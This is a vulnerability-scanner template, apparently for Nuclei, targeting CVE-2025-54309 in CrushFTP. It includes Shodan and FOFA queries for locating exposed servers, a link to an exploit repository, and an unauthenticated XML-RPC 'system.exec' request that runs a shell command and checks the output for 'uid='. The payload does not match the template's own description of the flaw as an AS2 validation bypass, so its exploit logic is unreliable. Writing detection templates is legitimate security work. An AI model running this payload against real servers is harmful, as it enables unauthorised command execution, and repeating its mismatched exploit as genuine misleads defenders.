id: CVE-2025-54309

info:
  name: CrushFTP - Unprotected Alternate Channel
  author: ANshu Bind
  severity: critical
  description: |
    CrushFTP 10 before 10.8.5 and 11 before 11.3.4_23, when the DMZ proxy feature is not used, mishandles AS2 validation and consequently allows remote attackers to obtain admin access via HTTPS, as exploited in the wild in July 2025.
  impact: |
    Remote attackers can gain administrative access, leading to full control over the CrushFTP server.
  remediation: |
    Update to version 10.8.5, 11.3.4_23 or later.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss_score: 9
    cve-id: CVE-2025-54309
    cwe-id: CWE-420
    epss-score: 0.07464
    epss-percentile: 0.91328
    cpe: cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*:*
  metadata:
    vendor: crushftp
    product: crushftp
    shodan-query:
      - http.html:"crushftp"
      - title:"CrushFTP - Login"
      - title:"CrushFTP WebInterface"
      - http.favicon.hash:-675750811
      - http.favicon.hash:-1022206565
      - http.favicon.hash:838835539
      - "Server: CrushFTP HTTP Server"
    fofa-query:
      - body="crushftp"
      - title="CrushFTP - Login"
      - title="CrushFTP WebInterface"
      - icon_hash="-675750811"
      - icon_hash="-1022206565"
      - icon_hash="838835539"
      - "Server: CrushFTP HTTP Server"
  reference:
    - https://www.crushftp.com/crush11wiki/Wiki.jsp?page=CompromiseJuly2025
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54309
    - https://github.com/advisories/GHSA-rh5q-v9ww-rqgm
    - https://github.com/issamjr/CVE-2025-54309-EXPLOIT
  tags: cve,cve2025,crushftp,rce,unauthenticated

variables:
  cmd: "id"

http:
  - method: POST
    path:
      - "{{BaseURL}}/WebInterface/function/"
    
    headers:
      Content-Type: application/xml
    
    body: |
      <?xml version="1.0"?>
      <methodCall>
        <methodName>system.exec</methodName>
        <params>
          <param>
            <value>
              <string>{{cmd}}</string>
            </value>
          </param>
        </params>
      </methodCall>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="
      - type: status
        status:
          - 200